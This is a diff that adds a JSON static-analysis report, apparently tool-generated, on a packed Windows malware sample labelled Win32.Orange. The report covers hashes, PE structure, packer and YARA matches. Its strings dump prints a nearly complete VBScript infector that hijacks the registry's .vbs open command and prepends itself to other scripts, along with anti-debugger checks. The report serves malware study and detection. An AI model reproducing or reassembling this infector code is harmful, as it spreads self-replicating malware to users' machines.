@@ -1,0 +1,197 @@
+{
+    "docinfo": {},
+    "filename": "VirusShare_72f8d744461c809b7196a162cd27aa5a",
+    "filesize": 8192,
+    "filetype": "PE32 executable (GUI) Intel 80386, for MS Windows",
+    "hashes": {
+        "md5": "72f8d744461c809b7196a162cd27aa5a",
+        "sha1": "07c0c684efc5b080b8c81beee1cfd3660f7cd496",
+        "sha256": "a4e1a2eb460d09d177dc7b630d7316f620f3d4eb6bbad2682844bae6f5d74ed6"
+    },
+    "peinfo": {
+        "behavior": [
+            "anti_dbgtools"
+        ],
+        "breakpoint": [],
+        "directories": {
+            "debug": {},
+            "export": [],
+            "import": {},
+            "relocations": {
+                "Size": 188,
+                "VirtualAddress": 8192,
+                "count": 1,
+                "details": {
+                    "reloc_1": 90
+                }
+            },
+            "resources": [],
+            "sign": {},
+            "tls": {
+                "AddressOfCallBacks": 65535,
+                "AddressOfIndex": 983044,
+                "Characteristics": 0,
+                "EndAddressOfRawData": 2,
+                "SizeOfZeroFill": 184,
+                "StartAddressOfRawData": 5265997
+            }
+        },
+        "dll": false,
+        "entrypoint": 4096,
+        "features": {
+            "antidbg": [],
+            "antivm": {},
+            "crypto": [],
+            "mutex": [],
+            "packer": [
+                "yodas_Protector_v1033_dllocx_Ashkbiz_Danehkar_h"
+            ],
+            "xor": {}
+        },
+        "imagebase": 4194304,
+        "imphash": "",
+        "metadata": {},
+        "sections": {
+            "count": 2,
+            "details": [
+                {
+                    "characteristics": 1610612768,
+                    "data": "b'`\\xe8\\t\\x00\\x00\\x00\\x8bd$\\x08\\xeb\\x13\\x90\\x90\\x9",
+                    "entropy": 5.758532099945306,
+                    "executable": true,
+                    "hash": {
+                        "md5": "f0aa68ffc069a711b00075c57be97db7",
+                        "sha1": "79b444fa6d0e194f28d4b4f3d8d56f77c4d3f6c5",
+                        "sha256": "c6c9b7d91239641569b6bf69a5ad3c0451bdf9ba57edff0592613350f155b587"
+                    },
+                    "section_name": "CODE",
+                    "size_of_raw_data": 3584,
+                    "virtual_address": 4096,
+                    "virtual_size": 4096
+                },
+                {
+                    "characteristics": 1342177344,
+                    "data": "b'\\x00\\x10\\x00\\x00\\xbc\\x00\\x00\\x00G0y0\\x8b0\\x9a0\\x",
+                    "entropy": 2.7932533226872587,
+                    "executable": false,
+                    "hash": {
+                        "md5": "b2eb3b554ad74617d4cbf891a092f4ee",
+                        "sha1": "bd5381aafd87f8a6cbc3f8ea65267cd24e5f59a3",
+                        "sha256": "c0224dd8feb5b4b1883b401fc35f1d88cc7c4e5fbbe152b8da8ec38717f56cdc"
+                    },
+                    "section_name": ".reloc",
+                    "size_of_raw_data": 512,
+                    "virtual_address": 8192,
+                    "virtual_size": 4096
+                }
+            ]
+        },
+        "timestamp": "1981-05-02 08:49:00"
+    },
+    "strings": {
+        "dump": [
+            "L!This program must be run under Win32",
+            "CODE",
+            "`.reloc",
+            "3d2d\"3",
+            "V_\u042aI",
+            "ffu\ue245",
+            "@u=HP",
+            "k3d0d ",
+            "HSw ,Wy",
+            "f8MZ",
+            "f>PE",
+            "V[v<",
+            "Hk(\u0781",
+            "QY]+\u042aI",
+            "CPCL",
+            "`3PX+",
+            "3PPj",
+            "3PQPj",
+            "3QPPj",
+            "3PP@PHP@Ph",
+            "3I33\u06ec2\u034a\u05b6",
+            "f5 fu33Ou\u044b",
+            "2u+`QY;u",
+            "open",
+            "ShellExecuteA",
+            "Shell32.dll",
+            "readme.txt.vbs",
+            "Call vbsNector",
+            "WScript.quit",
+            "Sub vbsNector()",
+            "Dim vi",
+            "Set s = WScript.Arguments",
+            "Set objShell = CreateObject(\"WScript.Shell\")",
+            "Set fs = CreateObject(\"Scripting.FileSystemObject\")",
+            "Myscript = WScript.ScriptFullName",
+            "Set f = fs.opentextfile(Myscript,1)",
+            "vir = f.ReadAll",
+            "f.close",
+            "Set f = Nothing",
+            "If InStr(1,LCase(Myscript),\"readme.txt.vbs\",1) Then",
+            "objShell.RegWrite \"HKEY_CLASSES_ROOT\\VBSFile\\Shell\\Open\\Command\\\",fs.GetSpecialFolder(0) + \"\\WScript.EXE \" + Myscript + \" %1 \" + Chr(34) + fs.GetSpecialFolder(0) + \"\\WScript.EXE \" + Chr(34) + \"%1\" + Chr(34) + \" %*\" + Chr(34)",
+            "End If",
+            "If s.Count > 1 Then",
+            "\t\tSet f = fs.opentextfile(s(0),1)",
+            "\t\tvi = f.ReadAll",
+            "\t\tf.close",
+            "\t\tSet f = Nothing",
+            "\t\tSet f = fs.createtextfile(\"$ttyk$.vb_\")",
+            "\t\tIf InStr(1,vi,\"vbsNector\",1) Then",
+            "\t\t\tExit Sub",
+            "\t\tEnd If",
+            "\t\tntt = InStr(1,vir,\"'\",1)",
+            "\t\tf.write \"call vbsNector\" + vbCrLf",
+            "\t\tf.write vi + vbCrLf",
+            "\t\tf.write Mid(vir,ntt,Len(vir)-ntt)",
+            "\t\tf.close",
+            "\t\tSet f = Nothing",
+            "\t\tobjShell.Run s(1)",
+            "\t\tfs.CopyFile \"$ttyk$.vb_\",s(0)",
+            "End If",
+            "End Sub",
+            "\u07ef-I{yBKRl\u0672Jbh",
+            "t$:Y\u06f2iBNY36",
+            "Sjk\\",
+            ".ntR?a",
+            "T\u0501q@6",
+            "\\\\.\\SICE",
+            "\\\\.\\NTICE",
+            "*.exe",
+            "[Win32.Orange by Ebola]",
+            "Dedicated to the NYFD and NYPD.",
+            "G0y00000000.151D1\\1c1r11111",
+            "2,232:2\\2b2h2n2t2z290111",
+            "2@2322222U3^3~333333334?4K4m44443394E4Q4g4}4444444444444",
+            "55555555"
+        ],
+        "file": {
+            "*.exe": "Executable",
+            "Shell32.dll": "Library"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.609836",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": [
+        {
+            "packer_compiler_signatures.yar": "IsPE32"
+        },
+        {
+            "packer_compiler_signatures.yar": "IsWindowsGUI"
+        },
+        {
+            "packer_compiler_signatures.yar": "HasOverlay"
+        },
+        {
+            "packer_compiler_signatures.yar": "ImportTableIsBad"
+        }
+    ]
+}
